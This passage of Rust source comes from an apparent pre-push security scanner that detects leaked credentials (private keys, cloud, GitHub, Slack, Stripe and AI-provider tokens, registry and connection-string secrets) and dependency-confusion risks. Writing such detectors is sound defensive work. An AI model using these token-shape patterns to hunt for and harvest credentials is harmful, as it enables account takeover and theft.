    .any(|needle| trimmed.ends_with(needle));

    if !is_private_key {
        return None;
    }

    Some(
        Finding::new(
            "secret.pattern.private-key-header",
            scanner,
            Severity::Critical,
            Confidence::High,
            FindingCategory::Secret,
            Some(file.to_path_buf()),
            "Private key material detected",
            "The candidate file contains a private key PEM header, which is almost always sensitive.",
            "Remove the key from version control immediately and rotate any associated credentials.",
            format!("secret-private-key:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_private_key_assignment(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let trimmed = line.trim();
    let without_export = trimmed.strip_prefix("export ").unwrap_or(trimmed);
    let (left, right) = without_export
        .split_once('=')
        .or_else(|| without_export.split_once(':'))?;
    let key = left.trim().trim_matches('"').trim_matches('\'');
    let normalized_key = normalize_identifier(key);
    if ![
        "privatekey",
        "private_key",
        "signingkey",
        "signing_key",
        "pemkey",
        "pem_key",
    ]
    .iter()
    .any(|needle| normalized_key == *needle || normalized_key.contains(needle))
    {
        return None;
    }

    let value = trim_wrapping_quotes(right.trim_matches(',').trim());
    let lower = value.to_ascii_lowercase();
    if looks_like_placeholder(value)
        || looks_like_template_expression(value)
        || !lower.contains("begin")
        || !lower.contains("private")
        || !lower.contains("key")
    {
        return None;
    }

    Some(
        Finding::new(
            "secret.assignment.private-key",
            scanner,
            Severity::Critical,
            Confidence::High,
            FindingCategory::Secret,
            Some(file.to_path_buf()),
            "Private key assignment detected",
            format!(
                "The candidate file assigns private key material directly to the sensitive identifier `{}`.",
                key
            ),
            "Remove the private key from source-controlled content immediately and move it to a secure secret-management path.",
            format!("secret-private-key-assignment:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_prefixed_secret_tokens(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    for rule in [
        PrefixedSecretRule {
            id: "secret.pattern.aws-access-key",
            title: "AWS access key identifier detected",
            detail: "The candidate file contains a token matching the shape of an AWS access key identifier.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "AKIA",
            min_length: 20,
            max_length: Some(20),
            allowed_characters: CharacterClass::UpperAlphaNumeric,
        },
        PrefixedSecretRule {
            id: "secret.pattern.aws-session-key",
            title: "AWS temporary access key identifier detected",
            detail: "The candidate file contains a token matching the shape of an AWS temporary access key identifier.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "ASIA",
            min_length: 20,
            max_length: Some(20),
            allowed_characters: CharacterClass::UpperAlphaNumeric,
        },
        PrefixedSecretRule {
            id: "secret.pattern.github-pat",
            title: "GitHub personal or installation token detected",
            detail: "The candidate file contains a token with a GitHub secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "ghp_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.github-pat",
            title: "GitHub token detected",
            detail: "The candidate file contains a token with a GitHub secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "gho_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.github-pat",
            title: "GitHub token detected",
            detail: "The candidate file contains a token with a GitHub secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "ghu_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.github-pat",
            title: "GitHub token detected",
            detail: "The candidate file contains a token with a GitHub secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "ghs_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.github-pat",
            title: "GitHub token detected",
            detail: "The candidate file contains a token with a GitHub secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "ghr_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.github-pat",
            title: "GitHub fine-grained token detected",
            detail: "The candidate file contains a token matching GitHub's fine-grained personal access token prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "github_pat_",
            min_length: 30,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.gitlab-pat",
            title: "GitLab personal access token detected",
            detail: "The candidate file contains a token with a GitLab personal access token prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "glpat-",
            min_length: 20,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.huggingface-token",
            title: "Hugging Face token detected",
            detail: "The candidate file contains a token with a Hugging Face secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "hf_",
            min_length: 20,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.slack-token",
            title: "Slack token detected",
            detail: "The candidate file contains a token with a Slack secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "xoxb-",
            min_length: 20,
            max_length: None,
            allowed_characters: CharacterClass::Slack,
        },
        PrefixedSecretRule {
            id: "secret.pattern.slack-token",
            title: "Slack token detected",
            detail: "The candidate file contains a token with a Slack secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "xoxp-",
            min_length: 20,
            max_length: None,
            allowed_characters: CharacterClass::Slack,
        },
        PrefixedSecretRule {
            id: "secret.pattern.slack-token",
            title: "Slack token detected",
            detail: "The candidate file contains a token with a Slack secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "xoxa-",
            min_length: 20,
            max_length: None,
            allowed_characters: CharacterClass::Slack,
        },
        PrefixedSecretRule {
            id: "secret.pattern.slack-token",
            title: "Slack token detected",
            detail: "The candidate file contains a token with a Slack secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "xoxr-",
            min_length: 20,
            max_length: None,
            allowed_characters: CharacterClass::Slack,
        },
        PrefixedSecretRule {
            id: "secret.pattern.slack-token",
            title: "Slack app-level token detected",
            detail: "The candidate file contains a token with a Slack app-level secret prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "xapp-",
            min_length: 20,
            max_length: None,
            allowed_characters: CharacterClass::Slack,
        },
        PrefixedSecretRule {
            id: "secret.pattern.stripe-live-key",
            title: "Stripe live secret key detected",
            detail: "The candidate file contains a token with a Stripe live key prefix.",
            severity: Severity::Critical,
            confidence: Confidence::High,
            prefix: "sk_live_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.stripe-live-key",
            title: "Stripe restricted live key detected",
            detail: "The candidate file contains a token with a Stripe restricted live key prefix.",
            severity: Severity::Critical,
            confidence: Confidence::High,
            prefix: "rk_live_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.stripe-webhook-secret",
            title: "Stripe webhook secret detected",
            detail: "The candidate file contains a token with a Stripe webhook secret prefix.",
            severity: Severity::Critical,
            confidence: Confidence::High,
            prefix: "whsec_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.openai-key",
            title: "OpenAI API key detected",
            detail: "The candidate file contains a token with an OpenAI API key prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "sk-proj-",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.openai-key",
            title: "OpenAI service account key detected",
            detail: "The candidate file contains a token with an OpenAI service account key prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "sk-svcacct-",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.anthropic-key",
            title: "Anthropic API key detected",
            detail: "The candidate file contains a token with an Anthropic API key prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "sk-ant-",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.npm-token",
            title: "npm token detected",
            detail: "The candidate file contains a token with an npm auth token prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "npm_",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafe,
        },
        PrefixedSecretRule {
            id: "secret.pattern.sendgrid-key",
            title: "SendGrid API key detected",
            detail: "The candidate file contains a token with a SendGrid API key prefix.",
            severity: Severity::High,
            confidence: Confidence::High,
            prefix: "SG.",
            min_length: 24,
            max_length: None,
            allowed_characters: CharacterClass::UrlSafeDots,
        },
    ] {
        for token in extract_prefixed_tokens(
            line,
            rule.prefix,
            rule.min_length,
            rule.max_length,
            rule.allowed_characters,
        ) {
            if looks_like_placeholder(&token) {
                continue;
            }

            findings.push(
                Finding::new(
                    rule.id,
                    scanner,
                    rule.severity,
                    rule.confidence,
                    FindingCategory::Secret,
                    Some(file.to_path_buf()),
                    rule.title,
                    rule.detail,
                    "Remove the secret from the repository, rotate it if it is real, and replace it with a secure runtime injection path.",
                    format!("secret-token:{}:{}:{}", rule.prefix, file.display(), line_number),
                )
                .with_line(line_number),
            );
        }
    }

    findings
}

fn scan_secret_assignment(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let (key, value) = extract_assignment(line)?;
    let normalized_key = normalize_identifier(&key);

    if !is_sensitive_identifier(&normalized_key) {
        return None;
    }

    let normalized_value = trim_wrapping_quotes(value.trim_matches(',').trim());
    if normalized_value.len() < 16 {
        return None;
    }

    if looks_like_placeholder(normalized_value) || looks_like_template_expression(normalized_value)
    {
        return None;
    }

    let entropy = shannon_entropy(normalized_value);
    let structured = looks_structured_secret(normalized_value);
    if entropy < 3.5 && !structured {
        return None;
    }

    let severity = if entropy >= 4.3 || normalized_value.len() >= 32 {
        Severity::High
    } else {
        Severity::Medium
    };

    Some(
        Finding::new(
            "secret.assignment.suspicious-value",
            scanner,
            severity,
            Confidence::Medium,
            FindingCategory::Secret,
            Some(file.to_path_buf()),
            "Suspicious secret-like assignment detected",
            format!(
                "The candidate file assigns a high-entropy value to the sensitive identifier `{key}`."
            ),
            "Move the secret to a secure runtime secret store or environment injection path and keep only a reference in source control.",
            format!(
                "secret-assignment:{}:{}:{}",
                file.display(),
                line_number,
                normalized_key
            ),
        )
        .with_line(line_number),
    )
}

fn scan_credential_url(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lowered = line.to_ascii_lowercase();
    let scheme_index = lowered.find("://")?;
    let after_scheme = &line[scheme_index + 3..];
    let at_index = after_scheme.find('@')?;
    let credentials = &after_scheme[..at_index];

    if !credentials.contains(':') {
        return None;
    }

    if looks_like_placeholder(credentials) {
        return None;
    }

    if looks_like_demo_credentials(credentials) {
        return None;
    }

    Some(
        Finding::new(
            "secret.url.embedded-credentials",
            scanner,
            Severity::High,
            Confidence::High,
            FindingCategory::Secret,
            Some(file.to_path_buf()),
            "Embedded credentials in URL detected",
            "The candidate file appears to contain a URL with inline credentials, which is a common source of credential leakage.",
            "Move credentials out of the URL and into a secure runtime configuration path.",
            format!("secret-url:{}:{}", file.display(), line_number),
        )
        .with_line(line_number),
    )
}

fn scan_inline_authorization_credential(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lowered = line.to_ascii_lowercase();
    let Some(authorization_index) = lowered.find("authorization") else {
        return None;
    };
    let after_authorization = &lowered[authorization_index + "authorization".len()..];
    let normalized_suffix = after_authorization.trim_start();
    if !normalized_suffix.starts_with(':') && !normalized_suffix.starts_with('=') {
        return None;
    }

    for (scheme, min_length, title, detail) in [
        (
            "bearer ",
            16usize,
            "Inline bearer token detected",
            "The candidate file appears to embed an Authorization bearer credential directly in content.",
        ),
        (
            "basic ",
            12usize,
            "Inline basic authorization credential detected",
            "The candidate file appears to embed an Authorization basic credential directly in content.",
        ),
    ] {
        let Some(marker_index) = lowered.find(scheme) else {
            continue;
        };

        let token = extract_inline_secret_token(&line[marker_index + scheme.len()..]);
        if token.len() < min_length || looks_like_placeholder(&token) {
            continue;
        }

        return Some(
            Finding::new(
                "secret.authorization.inline",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Secret,
                Some(file.to_path_buf()),
                title,
                detail,
                "Move the credential out of source-controlled content and inject it at runtime through a secure secret path.",
                format!("secret-authorization:{}:{}:{}", file.display(), line_number, scheme.trim()),
            )
            .with_line(line_number),
        );
    }

    None
}

fn scan_registry_auth_credential(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let file_name = file
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    match file_name.as_str() {
        ".npmrc" => {
            let (key, raw_value) = line.split_once('=')?;
            let normalized_key = normalize_identifier(key);
            if !normalized_key.contains("authtoken")
                && !normalized_key.ends_with("auth")
                && !normalized_key.ends_with("password")
            {
                return None;
            }

            let token = extract_inline_secret_token(raw_value);
            if token.len() < 12 || looks_like_placeholder(&token) {
                return None;
            }

            Some(
                Finding::new(
                    "secret.registry.npmrc-auth",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Secret,
                    Some(file.to_path_buf()),
                    "Registry credential detected in .npmrc",
                    "The candidate `.npmrc` line appears to embed registry authentication material directly in a tracked file.",
                    "Remove the registry credential from `.npmrc`, rotate it if it is real, and inject it at runtime through a secure user-local or CI secret path.",
                    format!("secret-npmrc-auth:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            )
        }
        ".netrc" => {
            let lowered = line.to_ascii_lowercase();
            let marker = "password ";
            let start = lowered.find(marker)?;
            let token = extract_inline_secret_token(&line[start + marker.len()..]);
            if token.len() < 8 || looks_like_placeholder(&token) {
                return None;
            }

            Some(
                Finding::new(
                    "secret.registry.netrc-password",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Secret,
                    Some(file.to_path_buf()),
                    "Credential detected in .netrc",
                    "The candidate `.netrc` line appears to embed a machine password directly in tracked content.",
                    "Remove the password from `.netrc`, rotate it if it is real, and keep machine credentials out of source control.",
                    format!("secret-netrc-password:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            )
        }
        ".pypirc" => {
            let (key, raw_value) = extract_assignment(line)?;
            let normalized_key = normalize_identifier(&key);
            if normalized_key != "password" && !normalized_key.contains("token") {
                return None;
            }

            let token = extract_inline_secret_token(raw_value);
            if token.len() < 8 || looks_like_placeholder(&token) {
                return None;
            }

            Some(
                Finding::new(
                    "secret.registry.pypirc-password",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Secret,
                    Some(file.to_path_buf()),
                    "Credential detected in .pypirc",
                    "The candidate `.pypirc` line appears to embed package registry credentials directly in tracked content.",
                    "Remove the credential from `.pypirc`, rotate it if it is real, and inject registry secrets through a secure local or CI path.",
                    format!("secret-pypirc-password:{}:{}", file.display(), line_number),
                )
                .with_line(line_number),
            )
        }
        _ => None,
    }
}

fn scan_inline_secret_header(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let (header_name, value) = extract_http_header(line)?;
    let normalized_header = normalize_identifier(&header_name);
    if ![
        "xapikey",
        "apikey",
        "xauthtoken",
        "authtoken",
        "xaccesstoken",
        "accesstoken",
    ]
    .iter()
    .any(|needle| normalized_header == *needle)
    {
        return None;
    }

    let token = extract_inline_secret_token(value);
    if token.len() < 16 || looks_like_placeholder(&token) {
        return None;
    }

    Some(
        Finding::new(
            "secret.header.inline",
            scanner,
            Severity::High,
            Confidence::High,
            FindingCategory::Secret,
            Some(file.to_path_buf()),
            "Inline HTTP secret header detected",
            format!(
                "The candidate file appears to embed a secret-bearing HTTP header `{header_name}` directly in content."
            ),
            "Move the secret value out of source-controlled request fixtures and inject it at runtime through a secure secret path.",
            format!(
                "secret-header:{}:{}:{}",
                file.display(),
                line_number,
                normalized_header
            ),
        )
        .with_line(line_number),
    )
}

fn scan_connection_string_secret(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let lowered = line.to_ascii_lowercase();
    let has_connection_context = line.contains(';')
        && (lowered.contains("server=")
            || lowered.contains("host=")
            || lowered.contains("endpoint=")
            || lowered.contains("accountname=")
            || lowered.contains("defaultendpointsprotocol=")
            || lowered.contains("user id=")
            || lowered.contains("uid="));
    if !has_connection_context {
        return None;
    }

    for key in [
        "accountkey",
        "sharedaccesskey",
        "sharedsecret",
        "password",
        "pwd",
        "clientsecret",
    ] {
        let Some(value) = extract_connection_string_value(line, key) else {
            continue;
        };

        if value.len() < 8 || looks_like_placeholder(&value) {
            continue;
        }

        return Some(
            Finding::new(
                "secret.connection-string.embedded-secret",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Secret,
                Some(file.to_path_buf()),
                "Connection string with embedded secret detected",
                format!(
                    "The candidate file appears to contain a connection string with embedded `{key}` material."
                ),
                "Remove live connection secrets from source control and inject them through a secure runtime configuration or secret store.",
                format!(
                    "secret-connection-string:{}:{}:{}",
                    file.display(),
                    line_number,
                    key
                ),
            )
            .with_line(line_number),
        );
    }

    None
}

fn scan_cookie_header_secret(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    let (header_name, value) = extract_http_header(line)?;
    let normalized_header = normalize_identifier(&header_name);
    if normalized_header != "cookie" && normalized_header != "setcookie" {
        return None;
    }

    for segment in value.split(';') {
        let Some((name, raw_value)) = segment.trim().split_once('=') else {
            continue;
        };

        let normalized_name = normalize_identifier(name);
        if !looks_sensitive_cookie_name(&normalized_name) {
            continue;
        }

        let token = extract_inline_secret_token(raw_value);
        if token.len() < 16 || looks_like_placeholder(&token) {
            continue;
        }

        let structured = looks_structured_secret(&token);
        let entropy = shannon_entropy(&token);
        if !structured && entropy < 3.5 {
            continue;
        }

        return Some(
            Finding::new(
                "secret.header.cookie",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Secret,
                Some(file.to_path_buf()),
                "Inline cookie or session secret detected",
                format!(
                    "The candidate file appears to embed a sensitive cookie or session header `{header_name}` with secret-bearing cookie name `{name}`."
                ),
                "Remove the live cookie or session value from source-controlled content and replace it with a redacted example or runtime injection path.",
                format!(
                    "secret-cookie:{}:{}:{}",
                    file.display(),
                    line_number,
                    normalized_name
                ),
            )
            .with_line(line_number),
        );
    }

    None
}

fn scan_service_webhook_url(
    scanner: &'static str,
    file: &Path,
    line_number: usize,
    line: &str,
) -> Option<Finding> {
    for (prefix, min_slashes, id, title, detail) in [
        (
            "https://hooks.slack.com/services/",
            2usize,
            "secret.webhook.slack",
            "Slack webhook URL detected",
            "The candidate file appears to contain a live Slack incoming webhook URL.",
        ),
        (
            "https://discord.com/api/webhooks/",
            1usize,
            "secret.webhook.discord",
            "Discord webhook URL detected",
            "The candidate file appears to contain a live Discord webhook URL.",
        ),
        (
            "https://discordapp.com/api/webhooks/",
            1usize,
            "secret.webhook.discord",
            "Discord webhook URL detected",
            "The candidate file appears to contain a live Discord webhook URL.",
        ),
    ] {
        let Some(token) = extract_prefixed_url_token(line, prefix) else {
            continue;
        };

        if token.len() <= prefix.len() || looks_like_placeholder(&token) {
            continue;
        }

        let suffix = &token[prefix.len()..];
        if suffix.len() < 16 || suffix.matches('/').count() < min_slashes {
            continue;
        }

        return Some(
            Finding::new(
                id,
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Secret,
                Some(file.to_path_buf()),
                title,
                detail,
                "Remove the webhook from source-controlled content, rotate it if it is real, and inject it through a secure runtime secret path.",
                format!("secret-webhook:{}:{}:{}", prefix, file.display(), line_number),
            )
            .with_line(line_number),
        );
    }

    None
}

fn dependency_relationship_findings(
    scanner: &'static str,
    context: &ExecutionContext,
) -> AppResult<Vec<Finding>> {
    let mut findings = Vec::new();
    let candidate_files = &context.candidate_files;
    let rust_manifest = changed_file(candidate_files, "Cargo.toml");
    let rust_lockfile = changed_file(candidate_files, "Cargo.lock");
    let node_manifest = changed_file(candidate_files, "package.json");
    let node_lockfile = changed_any_file(
        candidate_files,
        &[
            "package-lock.json",
            "npm-shrinkwrap.json",
            "pnpm-lock.yaml",
            "yarn.lock",
        ],
    );
    let go_manifest = changed_file(candidate_files, "go.mod");
    let go_lockfile = changed_file(candidate_files, "go.sum");
    let ruby_manifest = changed_any_file(candidate_files, &["Gemfile", "gems.rb"]);
    let ruby_lockfile = changed_any_file(candidate_files, &["Gemfile.lock", "gems.locked"]);
    let python_manifest = changed_any_path_suffix(
        candidate_files,
        &[
            "pyproject.toml",
            "requirements.txt",
            "requirements-dev.txt",
            "requirements-prod.txt",
            "requirements.in",
            "Pipfile",
        ],
    );
    let python_lockfile =
        changed_any_file(candidate_files, &["poetry.lock", "uv.lock", "Pipfile.lock"]);

    if let Some(rust_manifest) = rust_manifest {
        if rust_lockfile.is_none() && cargo_dependency_snapshot_changed(context, rust_manifest)? {
            findings.push(Finding::new(
                "dependency.lockfile.missing.rust",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Dependency,
                Some(rust_manifest.to_path_buf()),
                "Cargo manifest changed without a lockfile update",
                "A Rust dependency manifest is part of the outbound change set, but `Cargo.lock` is not.",
                "Review whether the change should also update `Cargo.lock` to preserve a reviewable dependency snapshot.",
                "dependency-lockfile-missing:rust",
            ));
        }
    }

    if node_manifest.is_some() && node_lockfile.is_none() {
        findings.push(Finding::new(
            "dependency.lockfile.missing.node",
            scanner,
            Severity::Medium,
            Confidence::High,
            FindingCategory::Dependency,
            node_manifest.cloned(),
            "Node manifest changed without a lockfile update",
            "A Node package manifest is part of the outbound change set, but no recognized Node lockfile changed alongside it.",
            "Review whether the change should also update `package-lock.json`, `pnpm-lock.yaml`, or `yarn.lock` to keep dependency resolution reviewable.",
            "dependency-lockfile-missing:node",
        ));
    }

    if let Some(go_manifest) = go_manifest {
        if go_lockfile.is_none() && go_dependency_snapshot_changed(context, go_manifest)? {
            findings.push(Finding::new(
                "dependency.lockfile.missing.go",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Dependency,
                Some(go_manifest.to_path_buf()),
                "go.mod changed without a go.sum update",
                "A Go module manifest is part of the outbound change set, but `go.sum` is not.",
                "Review whether the dependency change should also update `go.sum` to preserve a reviewable module snapshot.",
                "dependency-lockfile-missing:go",
            ));
        }
    }

    if let Some(ruby_manifest) = ruby_manifest {
        if ruby_lockfile.is_none() && gemfile_dependency_snapshot_changed(context, ruby_manifest)? {
            findings.push(Finding::new(
                "dependency.lockfile.missing.ruby",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Dependency,
                Some(ruby_manifest.to_path_buf()),
                "Ruby dependency manifest changed without a lockfile update",
                "A Bundler dependency manifest changed, but no recognized Ruby lockfile changed alongside it.",
                "Update `Gemfile.lock` or the active Bundler lockfile so resolved gems stay reviewable as part of the dependency change.",
                "dependency-lockfile-missing:ruby",
            ));
        }
    }

    if python_manifest.is_some() && python_lockfile.is_none() {
        findings.push(Finding::new(
            "dependency.lockfile.missing.python",
            scanner,
            Severity::Low,
            Confidence::Medium,
            FindingCategory::Dependency,
            python_manifest.cloned(),
            "Python dependency manifest changed without a lockfile update",
            "A Python dependency manifest changed, but no Python lockfile changed alongside it.",
            "If this repository relies on Poetry, uv, Pipenv, or another lockfile mechanism, update the lockfile as part of the dependency change.",
            "dependency-lockfile-missing:python",
        ));
    }

    Ok(findings)
}

fn dependency_confusion_findings(
    scanner: &'static str,
    context: &ExecutionContext,
) -> AppResult<Vec<Finding>> {
    let mut findings = Vec::new();

    if let Some(package_json) = repo_text_file(&context.repo_root.join("package.json"))? {
        let node_hosts = node_custom_registry_hosts(&context.repo_root)?;
        if !node_hosts.is_empty() {
            let mut mismatch_example: Option<(String, String)> = None;
            let mut ambiguity_example: Option<String> = None;

            for package in collect_unscoped_node_dependencies(&package_json) {
                if let Some(expected_host) = package_missing_expected_host(
                    &package,
                    context.config.node_registry_ownership.as_slice(),
                    node_hosts.as_slice(),
                ) {
                    mismatch_example
                        .get_or_insert_with(|| (package.clone(), expected_host.to_string()));
                    continue;
                }

                if package_matches_declared_owner_host(
                    &package,
                    context.config.node_registry_ownership.as_slice(),
                    node_hosts.as_slice(),
                ) {
                    continue;
                }

                if package_matches_ownership_policy(
                    &package,
                    context.config.node_internal_packages.as_slice(),
                    context.config.node_internal_package_prefixes.as_slice(),
                ) {
                    continue;
                }

                ambiguity_example.get_or_insert(package);
            }

            if let Some((example, expected_host)) = mismatch_example {
                findings.push(Finding::new(
                    "dependency.node.registry.ownership-host-mismatch",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(PathBuf::from("package.json")),
                    "Declared internal Node package owner host is not configured",
                    format!(
                        "The repository declares that `{example}` belongs on the private Node registry host `{expected_host}`, but the tracked Node registry config does not currently point that package ownership to that host."
                    ),
                    "Align the tracked Node registry config with the declared owner host, or update `.wolfence/config.toml` if the ownership rule is wrong.",
                    format!("dependency-node-registry-owner-mismatch:{expected_host}:{example}"),
                ));
            }

            if let Some(example) = ambiguity_example {
                findings.push(Finding::new(
                    "dependency.node.registry.ambiguous-package-ownership",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Dependency,
                    Some(PathBuf::from("package.json")),
                    "Custom Node registry config coexists with unscoped package names",
                    format!(
                        "The repository configures a non-default Node package registry, and `package.json` still includes unscoped packages such as `{example}`. That combination can increase dependency-confusion risk if package ownership across registries is not explicit."
                    ),
                    "Prefer scoped internal packages or declare exact names, package prefixes, and owner-host rules in `.wolfence/config.toml` before pushing.",
                    "dependency-node-registry-confusion",
                ));
            }
        }
    }

    for manifest in requirements_manifest_paths(&context.repo_root) {
        let Some(contents) = repo_text_file(&context.repo_root.join(&manifest))? else {
            continue;
        };
        if requirements_uses_custom_index(&contents) {
            let custom_hosts = requirements_custom_index_hosts(&contents);
            let mut mismatch_example: Option<(String, String)> = None;
            let mut ambiguity_example: Option<String> = None;

            for package in collect_unqualified_requirement_names(&contents) {
                if let Some(expected_host) = package_missing_expected_host(
                    &package,
                    context.config.python_index_ownership.as_slice(),
                    custom_hosts.as_slice(),
                ) {
                    mismatch_example
                        .get_or_insert_with(|| (package.clone(), expected_host.to_string()));
                    continue;
                }

                if package_matches_declared_owner_host(
                    &package,
                    context.config.python_index_ownership.as_slice(),
                    custom_hosts.as_slice(),
                ) {
                    continue;
                }

                if package_matches_ownership_policy(
                    &package,
                    context.config.python_internal_packages.as_slice(),
                    context.config.python_internal_package_prefixes.as_slice(),
                ) {
                    continue;
                }

                ambiguity_example.get_or_insert(package);
            }

            if let Some((example, expected_host)) = mismatch_example {
                findings.push(Finding::new(
                    "dependency.python.index.ownership-host-mismatch",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Dependency,
                    Some(manifest.clone()),
                    "Declared internal Python package owner host is not configured",
                    format!(
                        "The repository declares that `{example}` belongs on the private Python package host `{expected_host}`, but `{}` does not currently configure that host as part of its tracked package-index posture.",
                        manifest.display()
                    ),
                    "Align the tracked Python index config with the declared owner host, or update `.wolfence/config.toml` if the ownership rule is wrong.",
                    format!(
                        "dependency-python-index-owner-mismatch:{}:{}",
                        expected_host,
                        manifest.display()
                    ),
                ));
            }

            if let Some(example) = ambiguity_example {
                findings.push(Finding::new(
                    "dependency.python.index.ambiguous-package-ownership",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Dependency,
                    Some(manifest.clone()),
                    "Python package index override coexists with unqualified requirement names",
                    format!(
                        "The repository uses custom Python package indexes in `{}`, and the same manifest still includes unqualified package entries such as `{example}`. That combination can increase dependency-confusion risk if package ownership across indexes is not explicit.",
                        manifest.display()
                    ),
                    "Prefer one authoritative package index when possible, or declare exact names, package prefixes, and owner-host rules in `.wolfence/config.toml` for any internal names.",
                    format!("dependency-python-index-confusion:{}", manifest.display()),
                ));
                break;
            }
        }
    }

    Ok(findings)
}

fn dependency_resolution_owner_host_findings(
    scanner: &'static str,
    context: &ExecutionContext,
) -> AppResult<Vec<Finding>> {
    let mut findings = Vec::new();

    for file in &context.candidate_files {
        let full_path = context.repo_root.join(file);
        let Some(contents) = repo_text_file(&full_path)? else {
            continue;
        };

        let file_name = file
            .file_name()
            .and_then(|value| value.to_str())
            .unwrap_or_default();

        match file_name {
            "package.json" => findings.extend(scan_package_json_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.node_registry_ownership.as_slice(),
            )),
            "package-lock.json" | "npm-shrinkwrap.json" => {
                findings.extend(scan_node_lock_owner_host_findings(
                    scanner,
                    file,
                    &contents,
                    context.config.node_registry_ownership.as_slice(),
                ))
            }
            "pnpm-lock.yaml" => findings.extend(scan_pnpm_lock_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.node_registry_ownership.as_slice(),
            )),
            "yarn.lock" => findings.extend(scan_yarn_lock_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.node_registry_ownership.as_slice(),
            )),
            "Gemfile" | "gems.rb" => findings.extend(scan_gemfile_owner_host_findings(
                scanner,
                file,
                &contents,
                context.config.ruby_source_ownership.as_slice(),
            )),
            "Gemfile.lock" | "gems.locked" => {
